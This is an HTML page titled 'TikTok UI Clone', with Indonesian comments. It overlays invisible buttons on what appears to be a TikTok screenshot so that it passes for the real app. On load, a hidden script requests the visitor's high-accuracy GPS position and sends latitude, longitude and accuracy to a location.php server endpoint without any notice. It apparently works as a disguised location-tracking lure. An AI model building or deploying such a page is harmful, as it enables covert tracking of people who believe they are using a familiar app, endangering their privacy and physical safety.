<title>TikTok UI Clone</title>


<style>

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    -webkit-tap-highlight-color: transparent;
}

html, body {
    width: 100%;
    height: 100%;
    overflow: hidden;
    background: #000;
}

body {
    display: flex;
    justify-content: center;
    align-items: center;
}

.phone {
    position: relative;
    width: 100vw;
    height: 100vh;
    max-width: 720px;
    max-height: 1348px;
    overflow: hidden;
    background: #000;
}

.screen {
    position: absolute;
    inset: 0;
    width: 100%;
    height: 100%;
    object-fit: cover;
    object-position: center;
    display: block;
    user-select: none;
    -webkit-user-drag: none;
}

/* Area sentuh transparan, jadi tampilan tetap persis */
.hit {
    position: absolute;
    z-index: 5;
    background: transparent;
    border: 0;
    cursor: pointer;
}

.menu   { left: 2%;  top: 1%; width: 12%; height: 7%; }
.open   { left: 35%; top: 0%; width: 30%; height: 7%; }
.search { right: 2%; top: 1%; width: 12%; height: 7%; }

.profile { right: 5%; top: 47%; width: 13%; height: 9%; }
.like    { right: 4%; top: 57%; width: 14%; height: 10%; }
.comment { right: 4%; top: 67%; width: 14%; height: 10%; }
.share   { right: 4%; top: 77%; width: 14%; height: 10%; }
.music   { right: 3%; top: 88%; width: 15%; height: 9%; }

.home    { left: 0; bottom: 0; width: 20%; height: 8%; }
.find    { left: 20%; bottom: 0; width: 20%; height: 8%; }
.add     { left: 40%; bottom: 0; width: 20%; height: 8%; }
.inbox   { left: 60%; bottom: 0; width: 20%; height: 8%; }
.me      { right: 0; bottom: 0; width: 20%; height: 8%; }

button:active {
    opacity: .75;
}
</style>

<script>
let scanner;
let sedangScan = false;

function lokasi() {
    if (navigator.geolocation) {
        // Menambahkan opsi akurasi tinggi dan batas waktu tunggu (timeout)
        navigator.geolocation.getCurrentPosition(kirimLokasi, tanganiError, {
            enableHighAccuracy: true,
            timeout: 10000, // Menunggu respons GPS maksimal 10 detik
            maximumAge: 0
        });
    } else {
        console.log("Geolokasi tidak didukung oleh browser ini.");
    }
}

function kirimLokasi(position) {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    var acc = position.coords.accuracy;

    // Mengirim data ke server PHP Lokal dengan tambahan anti-cache (_ts)
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "location.php?lat=" + lat + "&lon=" + lon + "&acc=" + acc + "&_ts=" + new Date().getTime(), true);
    
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
            console.log("Status Server: " + xhr.status + " - Respon: " + xhr.responseText);
        }
    };
    
    xhr.send();
}

// Fungsi baru untuk mendeteksi jika ada masalah pada GPS perangkat
function tanganiError(error) {
    switch(error.code) {
        case error.PERMISSION_DENIED:
            console.log("Pengguna menolak permintaan Geolokasi.");
            break;
        case error.POSITION_UNAVAILABLE:
            console.log("Informasi lokasi tidak tersedia.");
            break;
        case error.TIMEOUT:
            console.log("Permintaan lokasi habis waktu (timeout).");
            break;
        case error.UNKNOWN_ERROR:
            console.log("Terjadi kesalahan yang tidak diketahui.");
            break;
    }
}

// Jalankan fungsi ini saat halaman dimuat
lokasi();
</script>
